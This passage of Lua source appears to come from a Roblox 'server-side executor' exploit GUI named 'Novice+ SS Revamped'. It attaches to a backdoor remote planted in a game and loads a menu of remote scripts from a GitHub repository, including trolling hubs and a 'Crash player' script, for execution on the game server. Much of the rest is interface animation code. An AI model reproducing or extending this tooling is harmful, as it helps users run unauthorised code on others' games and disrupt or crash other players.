		if not attached(3.5) then
			notify("Unable to find backdoor.\nGame not backdoored?")
		end
	end

	if game:IsLoaded() then
		pcall(Main)
	end

end
Revamped.MouseButton1Click:Connect(function()
	shutdown:Play()

	attachRevamped()
	if game.Players.LocalPlayer.PlayerGui:FindFirstChild("novice.exe") then else 
		errorSound:Play()
		local StarterGui = game:GetService("StarterGui")
		StarterGui:SetCore(
			"SendNotification",
			{
				Title = "Novice+ SS Revamped",
				Duration = 3,
				Text = "Could not attach proprely within 3.5 seconds, game might not have a backdoor?"
			}
		)
		return
	end
	mainlib.backdoorMode = game.Players.LocalPlayer.PlayerGui:FindFirstChild("novice.exe")
	if game.Players.LocalPlayer.PlayerGui:FindFirstChild("novice.exe") then
		mainlib.backdoorMode = game.Players.LocalPlayer.PlayerGui:FindFirstChild("novice.exe")["Local Backdoor"].Remote
	end
	TextLabel.Text = "Novice Revamped"
	transition(false,Frame_2.Attacher,{Transparency = 1},0.5)
	transition(false,Frame_2.Attacher.menuList,{ImageTransparency = 1},0.5)
	task.wait(0.475)
	Frame_2.Attacher:Destroy()
	mainlib.makeTabs(Scritps,"rbxassetid://6764432408",Vector2.new(150,0),Vector2.new(50,50))
	local executorList = {
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/SS%20Scripts/Ultimate%20Trolling%20Gui%20v6"] = "SS Ultimate Trolling Gui v6",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/SS%20Scripts/Fatherless%20hub"] = "SS Fatherless hub",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/SS%20Scripts/LES%20GO"] = "SS Dababy",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/SS%20Scripts/Krono%20hub"] = "SS Krono hub",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/SS%20Scripts/Astro%20hub"] = "SS Astro hub",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/SS%20Scripts/SS%20Minecraft"] = "SS Minecraft",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/SS%20Scripts/SS%20Juggernaut%20AI"] = "SS Juggernaut AI",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/SS%20Scripts/SS%20F3x"] = "SS F3x",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/SS%20Scripts/SS%20Crash%20player"] = "SS Crash player",
	}
	for i,v in pairs(executorList) do 
		mainlib.executorScripts(i,v)
	end

	mainlib.makeTabs("Exit","rbxassetid://6764432408",Vector2.new(100, 400),Vector2.new(50,50))

	transition(true,Frame_2.Executer,{BackgroundColor3 = Color3.fromRGB(194,194,194)})
	transition(true,Frame_2.Executer.menuList,{ImageColor3 = Color3.fromRGB(55,55,55)})
	for i,v in pairs(Frame_2:GetChildren()) do
		if v:IsA("TextButton") and v.Name ~= "Executer" then
			transition(true,v,{BackgroundColor3 = Color3.fromRGB(55,55,55)})
			transition(true,v.menuList,{ImageColor3 = Color3.fromRGB(194,194,194)})
		end
	end
	for i,v in pairs(Window:GetChildren()) do
		if v:IsA("Frame") then
			v.Visible = false
		end
	end


	transition(true,Window,{Transparency = 1, Size = UDim2.new(0.953, 0,3.559, 0),Position = UDim2.new(0.023, 0,0.985, 10)})
	task.wait(0.15)
	Window.Visible = true
	transition(false,Window,{Transparency = 0, Size = UDim2.new(1,0,3.735, 0),Position = UDim2.new(0,0,1,10)},0.5)
	task.wait(0.5 - 0.1)
	Executer.Visible = true
end)
